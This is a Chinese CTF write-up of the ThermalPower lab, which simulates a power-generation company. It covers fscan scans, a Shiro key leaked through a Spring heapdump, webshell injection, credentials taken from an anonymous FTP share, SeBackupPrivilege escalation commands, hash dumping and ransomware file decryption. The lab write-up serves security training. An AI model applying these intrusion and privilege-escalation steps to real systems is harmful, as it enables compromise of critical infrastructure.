# 春秋云境-ThermalPower综合渗透


春秋云境-ThermalPower综合渗透通关wp

<!--more-->

![image-20250126155831845](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126155831845.png?imageSlim)

靶标介绍：该场景模拟仿真了电力生产企业的部分业务场景。“火创能源” 公司在未充分重视网络安全的威胁的情况下，将敏感区域的服务错误地配置在公网上，使得外部的 APT 组织可以轻松地访问这些服务，最终导致控制电力分配、生产流程和其他关键设备的服务遭受攻击，并部署了勒索病毒。 玩家的任务是分析 APT 组织的渗透行为，按照关卡列表恢复其攻击路径，并对勒索病毒加密的文件进行解密。 附件地址：https://pan.baidu.com/s/13jTP6jWi6tLWkbyO8SQSnQ?pwd\=kj6h

## 外网打点

### 第一关

关卡剧情：评估暴露在公网的服务的安全性，尝试建立通向生产区的立足点。

起手fscan

```bash
E:\Tools\web\fscan_1.8.4>fscan.exe -h 39.98.113.46

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.98.113.46:8080 open
39.98.113.46:22 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle http://39.98.113.46:8080  code:302 len:0      title:None 跳转url: http://39.98.113.46:8080/login;jsessionid=9D9BBC5BC01314BE4A8641EAA809995B
[*] WebTitle http://39.98.113.46:8080/login;jsessionid=9D9BBC5BC01314BE4A8641EAA809995B code:200 len:2936   title:火创能源监控画面管理平台
[+] PocScan http://39.98.113.46:8080 poc-yaml-spring-actuator-heapdump-file
[+] PocScan http://39.98.113.46:8080 poc-yaml-springboot-env-unauth spring2
```

发现内存泄露

```bash
java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
```

拿到key

```bash
CookieRememberMeManager(ShiroKey)
-------------
algMode = CBC, key = QZYysgMYhG6/CzIJlVpR2g==, algName = AES
```

打shiro反序列化，注入冰蝎马，弹shell

```bash
root@security:/# whoami
root
```

发现是root权限，直接读flag

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126132414-v6pt4cr.png?imageSlim)​

## 内网渗透

### 第三关

关卡剧情：尝试接管 SCADA 工程师站，并启动锅炉。

内网信息收集

ifconfig

```bash
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.17.213  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe0d:1e04  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:0d:1e:04  txqueuelen 1000  (Ethernet)
        RX packets 130589  bytes 159982146 (159.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 55074  bytes 39322967 (39.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1876  bytes 158193 (158.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1876  bytes 158193 (158.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

内网fscan

```bash
./fscan -h 172.22.17.213/24

   ___                              _  
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <  
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.17.6     is alive
(icmp) Target 172.22.17.213   is alive
[*] Icmp alive hosts len is: 2
172.22.17.213:8080 open
172.22.17.6:445 open
172.22.17.6:139 open
172.22.17.6:135 open
172.22.17.6:80 open
172.22.17.213:22 open
172.22.17.6:21 open
[*] alive ports len is: 7
start vulscan
[*] NetBios 172.22.17.6     WORKGROUP\WIN-ENGINEER      
[*] NetInfo 
[*]172.22.17.6
   [->]WIN-ENGINEER
   [->]172.22.17.6
[*] WebTitle http://172.22.17.213:8080 code:302 len:0      title:None 跳转url: http://172.22.17.213:8080/login;jsessionid=F27C36D7263AE95B6931636B7EE0CB1D
[*] WebTitle http://172.22.17.213:8080/login;jsessionid=F27C36D7263AE95B6931636B7EE0CB1D code:200 len:2936   title:火创能源监控画面管理平台
[+] ftp 172.22.17.6:21:anonymous 
   [->]Modbus
   [->]PLC
   [->]web.config
   [->]WinCC
   [->]内部软件
   [->]火创能源内部资料
[*] WebTitle http://172.22.17.6        code:200 len:661    title:172.22.17.6 - /
[+] PocScan http://172.22.17.213:8080 poc-yaml-spring-actuator-heapdump-file 
[+] PocScan http://172.22.17.213:8080 poc-yaml-springboot-env-unauth spring2
```

发现有可anonymous登录的ftp

也可以直接访问80端口

frp穿透出来

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126142350-5m4femf.png?imageSlim)​

拿到相关机器账号密码

```bash
http://172.22.17.6/%E7%81%AB%E5%88%9B%E8%83%BD%E6%BA%90%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/SCADA.txt
```

```bash
WIN-SCADA: 172.22.26.xx
Username: Administrator
Password: IYnT3GyCiy3
```

frp扫一下172.22.26.0/24得到

```bash
./fscan -h 172.22.26.0/24

   ___                              _  
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <  
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.26.11    is alive
[*] Icmp alive hosts len is: 1
172.22.26.11:1433 open
172.22.26.11:139 open
172.22.26.11:135 open
172.22.26.11:80 open
172.22.26.11:445 open
[*] alive ports len is: 5
start vulscan
[*] NetBios 172.22.26.11    WORKGROUP\WIN-SCADA         
[+] mssql 172.22.26.11:1433:sa 123456
[*] NetInfo 
[*]172.22.26.11
   [->]WIN-SCADA
   [->]172.22.26.11
[*] WebTitle http://172.22.26.11       code:200 len:703    title:IIS Windows Server
```

rdp连过去172.22.26.11

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126150600-wklgl23.png?imageSlim)​

开启锅炉得到flag

### 第二关

尝试接管 SCADA 工程师的个人 PC，并通过滥用 Windows 特权组提升至系统权限。

在ftp中

从“内部员工通讯录.xlsx”中获取到员工信息

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126143430-bdaihir.png?imageSlim)​

从“火创能源内部通知.docx”中获取到默认密码规则

```bash
2. 登陆账户设置：
   为方便管理和标准化，登陆账户名将采用姓名全称的小写拼音形式。例如，张三的账户名为zhangsan，工号为0801。初始密码将由账户名+@+工号组成，例如，zhangsan@0801。
```

随机登录一个chenhua/chenhua@0813

rdp连到172.22.17.6

根据题目信息，需要用特权组提权，查看账户的特权组

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126143843-9r56g0f.png?imageSlim)​

可以看到该用户是属于 Backup Operators 组的一部分，默认情况下会授予该组 SeBackup 和 SeRestore 权限，SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，而忽略任何适当的 DACL（自由访问控制列表）。 此权限存在的背后动机是允许某些用户在系统中执行备份操作，而无需授予其完全的管理权限。

一旦拥有 SeBackup 和 SeRestore 权限，攻击者就可以通过使用多种技术轻松进行提权操作。 包括复制 SAM 和 SYSTEM 注册表配置单元（registry hives）以提取本地管理员的密码 hash 值。

但这里并没有给用户默认分配 SeBackup 权限

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126144029-5doecb4.png?imageSlim)​

‍

```bash
PS C:\Windows\system32> cd C:\Users\chenhua\Desktop\
PS C:\Users\chenhua\Desktop> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\Users\chenhua\Desktop> Import-Module .\SeBackupPrivilegeCmdLets.dll
PS C:\Users\chenhua\Desktop> Set-SeBackupPrivilege
PS C:\Users\chenhua\Desktop> Get-SeBackupPrivilege
SeBackupPrivilege is enabled
PS C:\Users\chenhua\Desktop> Copy-FileSeBackupPrivilege C:\Users\Administrator\flag\flag02.txt C:\Users\chenhua\Desktop\flag02.txt -Overwrite
Copied 350 bytes
PS C:\Users\chenhua\Desktop> cat flag02.txt
```

使用 impacket-secretsdump 从注册表转储文件中获取 ntlm 哈希：

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126150031-g43fhax.png?imageSlim)​

### 第四关

关卡剧情：尝试获取 SCADA 工程师站中的数据库备份，并分析备份文件是否泄漏了敏感数据。

rdp连回172.22.26.11

Win + D 返回desktop，发现桌面上有一个ScadaDB.sql.locky，还有一个勒索文件，说我们的文件已被加密

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126151554-1w19122.png?imageSlim)​

在 C 盘找到勒索病毒程序 Lockyou.exe

ida分析一下，发现该程序使用了 AES 加密文件

题目描述里给了一个privateKey和encryptedAesKey，使用privateKey用rsa加密了aeskey得到的encryptedAesKey

```bash
#privateKey
<RSAKeyValue><Modulus>uoL2CAaVtMVp7b4/Ifcex2Artuu2tvtBO25JdMwAneu6gEPCrQvDyswebchA1LnV3e+OJV5kHxFTp/diIzSnmnhUmfZjYrshZSLGm1fTwcRrL6YYVsfVZG/4ULSDURfAihyN1HILP/WqCquu1oWo0CdxowMsZpMDPodqzHcFCxE=</Modulus><Exponent>AQAB</Exponent><P>2RPqaofcJ/phIp3QFCEyi0kj0FZRQmmWmiAmg/C0MyeX255mej8Isg0vws9PNP3RLLj25O1pbIJ+fqwWfUEmFw==</P><Q>2/QGgIpqpxODaJLQvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbkVfy5Fw==</Q><DP>ulK51o6ejUH/tfK281A7TgqNTvmH7fUra0dFR+KHCZFmav9e/na0Q//FivTeC6IAtN5eLMkKwDSR1rBm7UPKKQ==</DP><DQ>PO2J541wIbvsCMmyfR3KtQbAmVKmPHRUkG2VRXLBV0zMwke8hCAE5dQkcct3GW8jDsJGS4r0JsOvIRq5gYAyHQ==</DQ><InverseQ>JS2ttB0WJm223plhJQrWqSvs9LdEeTd8cgNWoyTkMOkYIieRTRko/RuXufgxppl4bL9RRTI8e8tkHoPzNLK4bA==</InverseQ><D>tuLJ687BJ5RYraZac6zFQo178A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDoxRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQNUM6ss/2/CMM/EgM9vz0=</D></RSAKeyValue>
```

先把XML转成PEM格式

https://www.ssleye.com/ssltool/pem_xml.html

```bash
-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+
PyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3
YiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqr
rtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo17
8A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDox
RqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQN
UM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQz
J5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQ
vjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbk
Vfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/
xYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0
VJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQd
FiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUy
PHvLZB6D8zSyuGw=
-----END PRIVATE KEY-----
```

把encryptedAesKey解一下

https://www.lddgo.net/encrypt/rsa

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126154332-jojfuic.png?imageSlim)​

最后写个aes脚本解一下ScadaDB.sql.locky，把前16位作为iv

```bash
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

# 读取加密文件内容
encrypted_file = 'ScadaDB.sql.locky'
with open(encrypted_file, 'rb') as file:
    encrypted_data = file.read()

# 解密密钥
key = 'cli9gqXpTrm7CPMcdP9TSmVSzXVgSb3jrW+AakS7azk='
key = base64.b64decode(key)

# 按照每 16 位数据作为 IV 进行解密
iv = encrypted_data[:16]

# 创建 AES 解密器
cipher = AES.new(key, AES.MODE_CBC, IV=iv)

# 解密数据（去除 IV 后的部分）
decrypted_data = unpad(cipher.decrypt(encrypted_data[16:]), AES.block_size)

# 写入解密后的内容到新文件
decrypted_file = 'decrypted_file.txt'
with open(decrypted_file, 'wb') as file:
    file.write(decrypted_data)

print(f'文件解密完成，解密后的数据已保存到 {decrypted_file}')
```

随后在解密后的文件里查找flag

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250126151654-2ksqtyn.png?imageSlim)​

‍

